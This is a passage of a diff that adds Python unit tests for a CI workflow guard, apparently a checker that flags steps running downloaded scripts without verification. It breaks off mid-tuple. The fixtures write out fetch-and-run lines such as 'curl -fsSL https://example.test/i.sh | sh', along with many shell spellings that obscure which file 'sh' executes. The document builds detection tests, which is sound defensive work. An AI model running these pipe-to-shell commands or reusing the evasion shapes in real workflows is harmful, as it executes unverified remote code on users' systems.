@@ -14,7 +14,10 @@ $CMD` as `sh`), so a row that tests a dynamic command word -- or a holder,
 import unittest
 
 import shell_lex
+import shell_reader
 import workflow_guard as wg
+import workflow_called
+import workflow_uses
 
 URL = "https://example.test/"
 PIPE = "curl -fsSL %si.sh | sh" % URL
@@ -29,6 +32,3712 @@ UNGATED = "inside the script `%s` runs, and the step does not stop when that scr
 def defects(script):
     """The guard's answer for a job of one step running `script`."""
     return wg.job_defects([("step", script)])
+
+
+SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
+
+
+def reported(script, shell=None):
+    """Whether the guard reports a job of one step running `script` under `shell:`."""
+    return bool(wg.job_defects([wg.Step("step", script, shell)]))
+
+
+def filled(row, check=CHECK, use="chmod +x tool && ./tool", payload="tool"):
+    """A hunt row -- `@C@` the check, `@U@` the use, `@P@` the payload path -- as a step."""
+    return (GET + row.replace("\\n", "\n").replace("@C@", check).replace("@U@", use)
+            .replace("@P@", payload) + "\necho done\n")
+
+
+class TestANegatedGroupHoldingAFunctionHeader(unittest.TestCase):
+    """PR #2855 fix round (B1). `! { f() { CHECK; }; f; }` ⏎ USE: bash negates the group's
+    status and runs every command in a negated compound with errexit off, so the check's
+    failure stops nothing and USE runs; every shell runs it (8 parents). The `{`-ends-its-
+    statement step of #2664 had stranded the `!` on `{` alone, so the check read as gated
+    (main REPORT -> CLEAN). The `!` is now carried onto every statement the group holds --
+    which also closes the own-line `! {` ⏎ `CHECK` ⏎ `}`, a hole of main's."""
+
+    ROWS = ("! { f() { @C@; }; f; }\n@U@", "! { f(){ @C@; }; f; }\n@U@",
+            "! {\nf() { @C@; }; f; }\n@U@", "! { @C@; }\n@U@", "! {\n@C@\n}\n@U@",
+            "bash -ec '! { f() { @C@; }; f; }; @U@'", "! { f() { @C@; }; f; } && @U@",
+            "! { f() { @C@; }; f; } || exit 1\n@U@", "! { :; f() { @C@; }; f; }\n@U@",
+            "true && ! { f() { @C@; }; f; }\n@U@", "( ! { f() { @C@; }; f; } )\n@U@",
+            "! { f() { @C@; }; f; } | cat\n@U@", "! { f() { :; }; f; @C@; }\n@U@",
+            "! {\nf() { @C@; }\nf\n}\n@U@", "g() { ! { @C@; }; }\ng\n@U@",
+            "g() {\n! { @C@; }\n}\ng\n@U@", "g() {\n! { f() { @C@; }; f; }\n}\ng\n@U@",
+            "g() { @C@; }\n! { g; }\n@U@",
+            # Round 13: the mark is the FIRST stage's -- a call that heads a pipe in the group --
+            # and a plain group inside the negated one keeps a `!` word, as #2849 reads a check's
+            # negation from its own group (the round-12 seat's N13).
+            "! { f() { @C@; }; f | cat; }\n@U@", "! {\n{\n@C@\n}\n}\n@U@", "! { :; { @C@; }; }\n@U@")
+
+    def test_every_spelling_is_reported_under_every_shell_setting(self):
+        for row in self.ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_the_group_without_a_bang_reads_as_it_did(self):
+        # Under `-e` the check's failure stops the step: CLEAN where bash is strict.
+        for row in ("{ f() { @C@; }; f; }\n@U@", "{ @C@; }\n@U@"):
+            for shell in (None, "bash", "sh"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(filled(row), shell))
+
+
+class TestACalledFunctionsAssignmentReachesTheUse(unittest.TestCase):
+    """PR #2855 fix round (B2), #2785. `T=/dev/null; f(){ :; T=tool; }; f; sh "$T"`: bash runs
+    the body at the call, so `sh` runs the download; every shell runs it. Before #2664 the
+    misread header made `T=tool` the step's own statement (REPORT by accident); with the header
+    read, the body was skipped and the table held `/dev/null` at the use (CLEAN). The call now
+    adds the body's assignments as UNSURE candidates beside the caller's own
+    (`workflow_called.record_called`, round 2's fail-closed direction: the sure carry read past
+    a `return`, a wrapper, a later redefinition and a stand-in); `local` dies with the call; a
+    subshell body, a use before the call and a call before the definition carry nothing."""
+
+    ROWS = ('T=/dev/null; f(){ :; T=@P@; }; f; sh "$T"', 'T=/dev/null; f ( ) { :; T=@P@; }; f; sh "$T"',
+            'T=/dev/null; f() { :; T=@P@; }; f; sh "$T"', '{ f() { :; T=@P@; }; f; }; sh "$T"',
+            'T=/dev/null\ng ( )\n{\nT=@P@\n}\ng\nsh "$T"', 'f(){ :; T=@P@; }; f; sh "$T"',
+            'f(){\nT=@P@\n}\nf\nsh "$T"', 'f() { :; T=@P@; }; f; sh "$T"',
+            'T=/dev/null; if true; then f(){ :; T=@P@; }; fi; f; sh "$T"',
+            'T=/dev/null; for i in 1; do f(){ :; T=@P@; }; done; f; sh "$T"',
+            'T=/dev/null; { f() { :; T=@P@; }; }; f; sh "$T"',
+            'T=/dev/null; f() { :; T=@P@; }; { f; }; sh "$T"',
+            'f(){\ncurl -fsSLo tool.sh https://example.test/tool.sh\nT=tool.sh\n}\nf\nsh "$T"',
+            'T=/dev/null; f() { declare -g T=@P@; }; f; sh "$T"',
+            'T=/dev/null; f() { export T=@P@; }; f; sh "$T"',
+            'T=/dev/null; { f() { :; }; T=@P@; }; sh "$T"')
+    CONTROLS = ('T=/dev/null; f() { local T=@P@; }; f; sh "$T"', 'T=/dev/null; f() { T=@P@; }; sh "$T"; f',
+                'T=/dev/null; f() ( T=@P@ ); f; sh "$T"', 'T=/dev/null; f; f() { T=@P@; }; sh "$T"')
+
+    def test_every_spelling_is_reported_under_every_shell_setting(self):
+        for row in self.ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_what_bash_never_carries_stays_clean(self):
+        for row in self.CONTROLS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(filled(row), shell))
+
+    def test_the_rows_of_2785(self):
+        # x1: the call sets `T=x`, so bash runs `sh x` (F- x4): reported all the same under the
+        # fail-closed carry, the one price PR #2855's round 2 named (the sure carry is #2785's
+        # own PR); x2 (its inverse), x27 (`declare -g`), s10 (the second call's body reads the
+        # first's assignment) and the `local` row run the download.
+        get = "curl -fsSLo cuda_1.run https://example.test/cuda_1.run\n"
+        for row in ('g() { T=x; }\nT=cuda_1.run\ng\nsh "$T" || :\n',
+                    'g() { T=cuda_1.run; }\nT=x\ng\nsh "$T"\n',
+                    'f() { declare -g T=cuda_1.run; }; T=x; f; sh "$T"\n',
+                    'f() { sh "$T" || :; T=cuda_1.run; }; T=a; f; f\n',
+                    'g() { local T=x; }\nT=cuda_1.run\ng\nsh "$T"\n'):
+            for shell in (None, "bash", "sh"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(get + row, shell))
+
+
+class TheCarriedBangStandsBehindTheControlWords(unittest.TestCase):
+    """PR #2855 round 2 (B1). The carried `!` had become the first WORD the control-kind readers
+    saw, so `then`, `do`, `else`, `case` and an arm were never pushed and a branch assignment
+    read as sure: `T=P; ! { if false; then T=/dev/null; fi; }; sh "$T"` read CLEAN while every
+    shell runs `P`. The `!` now stands past the keywords that open a statement and past a `case`
+    arm, and not on a `for`/`case` header, a condition or a bare keyword; `! !` is one negation
+    (bash XORs: fail-closed); a short-circuit, a redirect-first statement and a `[[ ]]` inside
+    the group read under the `!` too."""
+
+    ROWS = ('T=@P@; ! { if false; then T=/dev/null; fi; }; sh "$T"',
+            'T=@P@; ! { for i in; do T=/dev/null; done; }; sh "$T"',
+            'T=@P@; ! { while false; do T=/dev/null; done; }; sh "$T"',
+            'T=@P@; ! { if true; then :; else T=/dev/null; fi; }; sh "$T"',
+            'T=@P@; ! {\nif false; then\nT=/dev/null\nfi\n}\nsh "$T"',
+            "! {\ncase x in\nx) @C@;;\nesac\n}\n@U@", "! {\nif true; then @C@; fi\n}\n@U@",
+            'T=@P@; g() { ! { if false; then T=/dev/null; fi; }; }; g; sh "$T"',
+            "! { ! @C@; }\n@U@", "! { [[ -f tool ]] && @C@; }\n@U@", "! { > log @C@; }\n@U@",
+            "! { @C@ || exit 1; }\n@U@", "! { @C@ && @U@; }", "! { @C@ || @U@; }")
+
+    def test_each_row_is_reported_under_every_shell_setting(self):
+        for row in self.ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_the_bang_stands_past_the_keywords(self):
+        # Round 13: the `!` is the first word's mark, which `negated` reads (`shell_tokens.bang`),
+        # so the control-kind readers -- and #2849's failure contexts -- see the words bash wrote.
+        argvs = [([str(word) for word in st.stages[0].argv], wg.shell_reader.negated(st.stages[0].argv))
+                 for st in wg.shell_reader.statements("! {\ncase x in\nx) CHECK;;\nesac\nif false; then T=x; fi\n}\n")]
+        self.assertEqual((["case", "x", "in"], False), argvs[1])
+        self.assertEqual((["CHECK"], True), (argvs[2][0][1:], argvs[2][1]))   # the arm marker first
+        self.assertEqual((["if", "false"], False), argvs[4])     # a condition: never under `!`
+        self.assertEqual((["then", "T=x"], True), argvs[5])
+        self.assertEqual([(["fi"], False), (["}"], False)], argvs[6:])
+
+
+class TestACallsEffectIsReadFailClosed(unittest.TestCase):
+    """PR #2855 round 2 (B2-B5): the sure carry replaced the caller's value past a `return` the
+    body takes, through a wrapper that never runs a function (`env f`, `timeout 5 f`), past a
+    later redefinition or `unset -f`, by a stand-in, and by a `declare -g` bash 3.2 and dash lack
+    -- each `T=P; …; sh "$T"` CLEAN while every shell runs `P`. A call now adds the body's
+    assignments unsure beside the caller's own, so each reports; the named price is `T=P; f() {
+    T=/dev/null; }; f; sh "$T"`, reported though no shell runs `P`."""
+
+    ROWS = ('T=@P@; f() { return; T=/dev/null; }; f; sh "$T"',
+            'T=@P@; f() { if true; then return; fi; T=/dev/null; }; f; sh "$T"',
+            'T=@P@; f() { [ -f x ] || return 0; T=/dev/null; }; f; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; env f || true; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; timeout 5 f || true; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; command f; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; if true; then f() { :; }; fi; f; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; true && f() { :; }; f; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; [ -n "$X" ] || f() { :; }; f; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; if true; then unset -f f; fi; f || :; sh "$T"',
+            'T=@P@; { f() { T=/dev/null; }; } | cat; f; sh "$T"',
+            'T=@P@; f(){ T=$1; }; f "$T"; sh "$T"', 'T=@P@; f(){ T=${X:-$T}; }; f; sh "$T"',
+            'T=@P@; f() { declare -g T=/dev/null; }; f; sh "$T"',
+            'T=@P@; f() { readonly T=/dev/null; }; f; sh "$T"',
+            'T=@P@; f() { declare -gx T=/dev/null; }; f; sh "$T"',
+            'T=@P@; if c; then f() { T=/dev/null; }; else f() { T=@P@; }; fi; f; sh "$T"',
+            'T=@P@; g() { T=/dev/null; }; f() { g; }; f; sh "$T"',
+            'T=@P@; f() { T=/dev/null; }; f; sh "$T"',
+            # A call inside a `case` arm, in five spellings (the round-3 seat's C91), and a
+            # non-matching arm, read fail-closed as a branch that does not run is.
+            'T=/dev/null; f(){ T=@P@; }; case x in x) f;; esac; sh "$T"',
+            'T=/dev/null; f(){ T=@P@; }; case x in x) f ;; esac; sh "$T"',
+            'T=/dev/null; f(){ T=@P@; }\ncase x in\nx) f;;\nesac\nsh "$T"',
+            'T=/dev/null; f(){ T=@P@; }; case x in x) :; f;; esac; sh "$T"',
+            'T=/dev/null; f(){ T=@P@; }\ncase x in\nx)\nf\n;;\nesac\nsh "$T"',
+            'T=/dev/null; f(){ T=@P@; }; case x in y) f;; esac; sh "$T"')
+
+    def test_each_row_is_reported_under_every_shell_setting(self):
+        for row in self.ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+
+class TestTheCarryPastTheCandidateCap(unittest.TestCase):
+    """PR #2855 round 3 (B1 and F1). Past the candidate cap (`_CANDIDATES`, eight) the table
+    held a carried name's stand-in alone, which a use reads as nothing: eight body assignments
+    went CLEAN while every parent runs `P` (seven still reported). The merge back into the
+    caller's table never drops the caller's own candidates now. F1: `time f` and `eval f` run
+    the function (no wrapper), and the arm of a one-line `case` is stepped past before the head
+    walk, so a group, an assignment, a `!` or an `if` between the arm and the call still reach
+    it. `main`'s own top-level cap (x20) stands, named in the gap list."""
+
+    SEVEN = "T=a; T=b; T=c; T=d; T=e; T=f; T=g"
+    EIGHT = SEVEN + "; T=h"
+    NINE = EIGHT + "; T=i"
+    ROWS = ('T=@P@; f() { if false; then %s; fi; }; f; sh "$T"' % SEVEN,
+            'T=@P@; f() { if false; then %s; fi; }; f; sh "$T"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; sh "$T"' % NINE,
+            'T=@P@; f() { if false; then unset T; %s; fi; }; f; sh "$T"' % EIGHT,
+            'T=@P@; g() { if false; then %s; fi; }; f() { g; }; f; sh "$T"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; bash "$T"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; U=$T; sh "$U"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; sh "$T" || :' % EIGHT,
+            'T=/dev/null; f() { T=@P@; }; time f; sh "$T"', 'T=/dev/null; f() { T=@P@; }; eval f; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) { f; };; esac; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) X=1 f;; esac; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) ! f;; esac; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) if f; then :; fi;; esac; sh "$T"')
+
+    def test_each_row_is_reported_under_every_shell_setting(self):
+        for row in self.ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_the_callers_value_stands_beside_the_stand_in(self):
+        stmts = wg.shell_reader.statements('T=P; f() { if false; then %s; fi; }; f; sh "$T"\n' % self.NINE)
+        table = workflow_uses.static_values(stmts, len(stmts) - 1).scalars["T"]
+        self.assertEqual("P", table[0])
+        self.assertIn(workflow_uses.PAST, table)        # round 7: the cap's stand-in, read as a use
+
+
+SEVEN_CARRIED = "T=a; T=b; T=c; T=d; T=e; T=f; T=g"
+
+
+class TestACarriedNameLaterPushedPastTheCap(unittest.TestCase):
+    """PR #2855 round 4 (B1 and F1). The carried candidates count against the caller's budget,
+    so the NEXT unsure update of the name after the call pushed the table past the cap, and the
+    stand-in alone read as nothing: `T=P; f() { if false; then T=a; … T=g; fi; }; f; false &&
+    T=x; sh "$T"` went CLEAN while every parent runs `P`, as did the 7-arm `uname` dispatcher
+    with an OVERRIDE line after it. Past the cap a name now keeps its first eight beside the
+    cap's stand-in, which a use reads as every download (round 7, `TestEveryCapLeavesItsStandIn`),
+    so each reports, as do `main`'s own x20 rows where a shell runs the payload. F1: `time` (one `-p`, then one `--`) and `eval` (one `--`), then a group, an
+    assignment, a `!` or an `if`, reach the call; and a function named like a wrapper (`sudo() {
+    … }; sudo x`) is the call bash makes of it."""
+
+    SEVEN = SEVEN_CARRIED
+    LATER = ("false && T=x", "if false; then T=x; fi", "eval :", "false && unset T", "false && read T",
+             "for T in $(echo @P@); do :; done", ". /dev/null", "case x in y) T=x;; esac",
+             '[ -n "$NOPE" ] && T=x', "while false; do T=x; done", 'K=X; export "$K=1"',
+             'N=X; read "$N" < /dev/null || :', "false && T=x; false && T=y", "false && T=x; f",
+             "false && T+=x", "false && T=x; g() { if false; then T=y; fi; }; g")
+    ROWS = tuple('T=@P@; f() { if false; then %s; fi; }; f; %s; sh "$T"' % (SEVEN_CARRIED, later)
+                 for later in LATER) + (
+        'T=@P@; f() { if false; then T=a; fi; }; f; ' + "; ".join("false && T=%s" % c for c in "bcdefgh") + '; sh "$T"',
+        'g() { if false; then %s; fi; }; T=@P@; g; false && T=x; sh "$T"' % SEVEN,
+        'T=@P@; f() { if false; then %s; fi; }; if true; then f; fi; false && T=x; sh "$T"' % SEVEN,
+        'T=@P@; f() { if false; then %s; fi; }; f || true; false && T=x; sh "$T"' % SEVEN,
+        'T=@P@; f() { if false; then %s; fi; }; f; false && T=x; bash "$T"' % SEVEN,
+        'T=@P@; f() { if false; then %s; fi; }; f; false && T=x; U=$T; sh "$U"' % SEVEN,
+        'T=@P@\nset_target() {\ncase "$(uname -s)" in\nDarwin) T=a;;\nFreeBSD) T=b;;\nOpenBSD) T=c;;\n'
+        'NetBSD) T=d;;\nSunOS) T=e;;\nAIX) T=f;;\nHP-UX) T=g;;\nesac\n}\nset_target\n'
+        '[ -n "${OVERRIDE:-}" ] && T=$OVERRIDE\nsh "$T"',
+        # The merge-path controls: two bodies of eight, a chain adding 3 + 3 + 2, a full caller.
+        'T=@P@; f() { if false; then %s; T=h; fi; }; g() { if false; then T=i; T=j; T=k; T=l; T=m; T=n; '
+        'T=o; T=p; fi; }; f; g; sh "$T"' % SEVEN,
+        'T=@P@; h() { if false; then T=g; T=h; fi; }; g() { if false; then T=d; T=e; T=f; fi; h; }; '
+        'f() { if false; then T=a; T=b; T=c; fi; g; }; f; sh "$T"',
+        'T=@P@; ' + "; ".join("false && T=%s" % c for c in "abcdefg") + '; f() { if false; then T=h; fi; }; f; '
+        'false && T=i; sh "$T"',
+        # The body's own payload among eight, assigned first in the body.
+        'f() { T=@P@; if false; then %s; fi; }; f; sh "$T"' % SEVEN)
+    F1 = ("T=/dev/null; f() { T=@P@; }; time -p f; sh \"$T\"", "T=/dev/null; f() { T=@P@; }; time -- f; sh \"$T\"",
+          "T=/dev/null; f() { T=@P@; }; time -p -- f; sh \"$T\"", "T=/dev/null; f() { T=@P@; }; time { f; }; sh \"$T\"",
+          "T=/dev/null; f() { T=@P@; }; time X=1 f; sh \"$T\"", "T=/dev/null; f() { T=@P@; }; time ! f; sh \"$T\"",
+          "T=/dev/null; f() { T=@P@; }; case x in x) time if f; then :; fi;; esac; sh \"$T\"",
+          "T=/dev/null; f() { T=@P@; }; case x in x) time { f; };; esac; sh \"$T\"",
+          "T=/dev/null; f() { T=@P@; }; case x in x) time -p { f; };; esac; sh \"$T\"",
+          "T=/dev/null; f() { T=@P@; }; time eval f; sh \"$T\"", "T=/dev/null; f() { T=@P@; }; eval time f; sh \"$T\"",
+          "T=/dev/null; f() { T=@P@; }; eval -- f; sh \"$T\"", "T=/dev/null; sudo() { T=@P@; }; sudo x; sh \"$T\"")
+    # Honest clears that stay clear: a wrapper with no function of its name runs none.
+    CONTROLS = tuple("T=/dev/null; f() { T=@P@; }; %s f; sh \"$T\"" % w for w in ("env", "command", "builtin", "nohup",
+                                                                                  "timeout 5", "nice", "sudo"))
+
+    def test_each_row_is_reported_under_every_shell_setting(self):
+        for row in self.ROWS + self.F1:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_a_wrapper_with_no_function_of_its_name_calls_none(self):
+        for row in self.CONTROLS:
+            for shell in (None, "bash", "sh"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(filled(row), shell))
+
+    def test_past_the_cap_the_first_eight_stand_beside_the_stand_in(self):
+        # Round 7: the first eight in the order bash assigns them, then the cap's stand-in, which
+        # the use reads as every download -- `x`, the ninth, is dropped and still reported.
+        stmts = wg.shell_reader.statements(
+            'T=P; f() { if false; then %s; fi; }; f; false && T=x; sh "$T"\n' % self.SEVEN)
+        self.assertEqual(["P", "a", "b", "c", "d", "e", "f", "g", workflow_uses.PAST],
+                         workflow_uses.static_values(stmts, len(stmts) - 1).scalars["T"])
+
+
+class TestAPayloadAnywhereAmongTheCandidatesReports(unittest.TestCase):
+    """PR #2855 round 5 (B1 and B2): past the cap a name kept only its first candidate, so a
+    payload anywhere else among the caller's own was dropped (`T=x; [ -z "$NOPE" ] && T=P; f() {
+    … six … }; f; false && T=y; sh "$T"` CLEAN while every shell runs `P`), and an array past the
+    cap kept nothing -- `_carry` even popped the caller's word-lists. Round 6 ordered the cap,
+    the caller's own first, which its seat broke three more ways; round 7 retired the ordering:
+    every cap leaves its stand-in, which a use reads as every download
+    (`TestEveryCapLeavesItsStandIn`). The rows are the round-5 seat's, each with its ground truth
+    (8 parents: every one runs the payload, or for an array both bashes do; the honest clears
+    run nothing)."""
+
+    ALL_RUN = (  # Y06, Y20, L01, L04, L18, F02, F13, F24, E06
+        'T=x; [ -z "$NOPE" ] && T=@P@; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; fi; }; f; false && T=y; sh "$T"',
+        'T=x; case x in x) T=@P@;; esac; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; fi; }; f; false && T=y; sh "$T"',
+        'T=x; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; fi; }; f; [ -z "$NOPE" ] && T=@P@; sh "$T"',
+        'T=/dev/null\nset_target() {\ncase "$(uname -s)" in\nDarwin) T=a;;\nFreeBSD) T=b;;\nOpenBSD) T=c;;\nNetBSD) T=d;;\n'
+        'SunOS) T=e;;\nAIX) T=f;;\nHP-UX) T=g;;\nesac\n}\nset_target\n[ "$(uname -s)" = Linux ] && T=@P@\nsh "$T"',
+        'TOOL=/dev/null\nselect_tool() {\ncase "$RUNNER_OS" in\nmacOS) TOOL=a;;\nWindows) TOOL=b;;\nFreeBSD) TOOL=c;;\n'
+        'OpenBSD) TOOL=d;;\nNetBSD) TOOL=e;;\nSunOS) TOOL=f;;\nAIX) TOOL=g;;\nesac\n}\nselect_tool\n'
+        'if [ "$(uname -s)" = Linux ]; then\nTOOL=@P@\nfi\nsh "$TOOL"',
+        'T=${OVERRIDE:-}; [ -z "$T" ] && T=@P@; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; fi; }; f; false && T=y; sh "$T"',
+        'f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; fi; }; f; [ -z "${NOPE:-}" ] && T=@P@; sh "$T"',
+        'INSTALLER=/dev/null\nif [ "$(uname -s)" = Linux ]; then\n  INSTALLER=@P@\nfi\ndetect_arch() {\n'
+        '  case "$(uname -m)" in\n    i386) INSTALLER=a;;\n    armv7l) INSTALLER=b;;\n    ppc64le) INSTALLER=c;;\n'
+        '    s390x) INSTALLER=d;;\n    riscv64) INSTALLER=e;;\n    mips) INSTALLER=f;;\n  esac\n}\ndetect_arch\n'
+        '[ -n "${INSTALLER_OVERRIDE:-}" ] && INSTALLER=$INSTALLER_OVERRIDE\nsh "$INSTALLER"',
+        'T=@P@; command -v sh > /dev/null || T=/dev/null; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; fi; }; f; '
+        'false && T=y; sh "$T"',
+        # A payload the call itself carried in, then a later update past the cap: the cap's
+        # stand-in, which a use reads as every download (round 7).
+        'T=/dev/null; f() { T=@P@; if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; fi; }; f; false && T=y; sh "$T"')
+    BASH_RUN = (  # B03-B08, B10, B11: arrays (dash has none)
+        'declare -a T=(@P@); f() { if false; then T=(a); T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); T=(h); fi; }; f; sh "${T[0]}"',
+        'declare -a T=(@P@); f() { if false; then T=(a); T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); fi; }; f; false && T=(y); '
+        'sh "${T[0]}"',
+        'declare -a T=(x); [ -z "${NOPE:-}" ] && declare -a T=(@P@); f() { if false; then T=(a); T=(b); T=(c); T=(d); T=(e); '
+        'T=(f); fi; }; f; false && T=(y); sh "${T[0]}"',
+        'declare -a T=(@P@ x); f() { if false; then T=(a); T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); T=(h); fi; }; f; sh "${T[@]}"',
+        'declare -a T=(@P@); f() { if false; then T=(a); T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); T=(h); fi; }; f; sh "$T"',
+        'declare -a T=(@P@); f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; T=h; fi; }; f; sh "${T[0]}"',
+        'declare -a CMD=(sh @P@)\nf() {\n  if [ -n "${NOPE:-}" ]; then CMD=(a); CMD=(b); CMD=(c); CMD=(d); CMD=(e); CMD=(f); '
+        'CMD=(g); CMD=(h); fi\n}\nf\n"${CMD[@]}"',
+        'declare -a T=(@P@); ' + "; ".join("false && T=(%s)" % c for c in "abcdefgh") + '; sh "${T[0]}"')
+    NONE_RUN = (  # E01 (eight candidates), and a call the step backgrounds: honest clears
+        'T=; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; fi; }; f; sh "$T"',
+        'T=/dev/null; f() { T=@P@; }; f & sh "$T"')
+    PRICE = (  # E02, E05: nine candidates, none the payload -- the cap's price since round 7
+        'T=; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; fi; }; f; false && T=y; sh "$T"',
+        'T=x; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; fi; }; f; false && T=y; sh "$T"')
+
+    def test_each_payload_row_is_reported(self):
+        for rows, shells in ((self.ALL_RUN, SHELLS), (self.BASH_RUN, (None, "bash", "bash {0}"))):
+            for row in rows:
+                for shell in shells:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(filled(row), shell))
+
+    def test_each_honest_clear_stays_clear(self):
+        for row in self.NONE_RUN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(filled(row), shell))
+
+    def test_the_price_past_the_cap_is_reported(self):
+        for row in self.PRICE:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_the_first_eight_stand_beside_the_stand_in_and_an_array_keeps_its_lists(self):
+        def table(script):
+            stmts = wg.shell_reader.statements(script + "\n")
+            return workflow_uses.static_values(stmts, len(stmts) - 1)
+        scalars = table('T=x; [ -z "$NOPE" ] && T=P; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; fi; }; f; '
+                        'false && T=y; sh "$T"').scalars["T"]
+        self.assertEqual(["x", "P", "a", "b", "c", "d", "e", "f", workflow_uses.PAST], scalars)
+        values = table('declare -a T=(P); f() { if false; then T=(a); T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); T=(h); '
+                       'fi; }; f; sh "${T[0]}"')
+        self.assertEqual(["P"], values.arrays["T"][0])
+        self.assertEqual([workflow_uses.PAST], values.arrays["T"][-1])
+
+
+class TestEveryCapLeavesItsStandIn(unittest.TestCase):
+    """PR #2855 round 7: the coordinator's ruling on round 6's three more cap edges -- B1, a stale
+    carried mark dropped the caller's own payload; B2, the stand-in took one of the eight slots;
+    B4, the word cap at the use put carried scalars ahead of an own `declare -a T=(P)` -- and on
+    #2871 (B3: a payload the step itself makes a name's ninth candidate, CLEAN on `main` too).
+    The ordering no longer carries safety: every truncation -- a name's (`_update`), a word's
+    (`valued`), an argv's (`valued_argvs`) -- leaves the cap's stand-in `PAST`, and a use holding
+    it reads as every download the step holds there, so it reports wherever an unverified one can
+    reach it; a write of the whole value or a sure `unset` ends it. The price, pinned: a use of a name with nine
+    or more candidates reports where no shell runs a download. Rows are the round-6 seat's, with
+    its ground truth over 8 parents (all run the payload; the bash rows, both bashes), and the
+    row-level controls."""
+
+    ALL_RUN = (
+        # B1: DS01, and DS05, the installer shape.
+        'T=x; f() { if false; then T=@P@; fi; }; f; T=x; g() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; '
+        'fi; }; g; [ -z "${NOPE:-}" ] && T=@P@; sh "$T"',
+        'INSTALLER=/dev/null\nuse_default() {\n  if [ -n "${USE_DEFAULT:-}" ]; then INSTALLER=@P@; fi\n}\nuse_default\n'
+        'INSTALLER=/dev/null\ndetect_arch() {\n  case "$(uname -m)" in\n    i386) INSTALLER=a;;\n    armv7l) INSTALLER=b;;\n'
+        '    ppc64le) INSTALLER=c;;\n    s390x) INSTALLER=d;;\n    riscv64) INSTALLER=e;;\n    mips) INSTALLER=f;;\n'
+        '    sparc64) INSTALLER=g;;\n  esac\n}\ndetect_arch\nif [ "$(uname -s)" = Linux ]; then\n  INSTALLER=@P@\nfi\n'
+        'sh "$INSTALLER"',
+        # B2: DN10, and DM02, a `load()` helper and a seven-arm `uname -s` dispatcher.
+        'T=x; f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; fi; }; f; '
+        + "; ".join("false && T=%d" % number for number in range(1, 7)) + '; [ -z "${NOPE:-}" ] && T=@P@; sh "$T"',
+        'T=/dev/null; load() { if [ -n "${A:-}" ]; then T=custom-a; fi; if [ -n "${B:-}" ]; then T=custom-b; fi; }; '
+        'load; case "$(uname -s)" in Darwin) T=darwin.sh;; FreeBSD) T=freebsd.sh;; OpenBSD) T=openbsd.sh;; '
+        'NetBSD) T=netbsd.sh;; SunOS) T=sunos.sh;; AIX) T=aix.sh;; Linux) T=@P@;; esac; sh "$T"',
+        # B3: DC03, and DC18, a seven-arm dispatcher then an OVERRIDE line (CLEAN on `main`).
+        'f() { T=@P@; }; f; ' + "; ".join("false && T=%d" % number for number in range(1, 9)) + '; sh "$T"',
+        'T=/dev/null\nset_target() {\n  case "$(uname -s)" in\n    Darwin) T=a;;\n    FreeBSD) T=b;;\n'
+        '    OpenBSD) T=c;;\n    NetBSD) T=d;;\n    SunOS) T=e;;\n    AIX) T=f;;\n    Linux) T=@P@;;\n  esac\n}\n'
+        'set_target\n[ -n "${OVERRIDE:-}" ] && T=$OVERRIDE\nsh "$T"',
+        # #2871's two nine-candidate rows (CLEAN on `main`).
+        'for T in a b c d e f g h @P@; do :; done; sh "$T"',
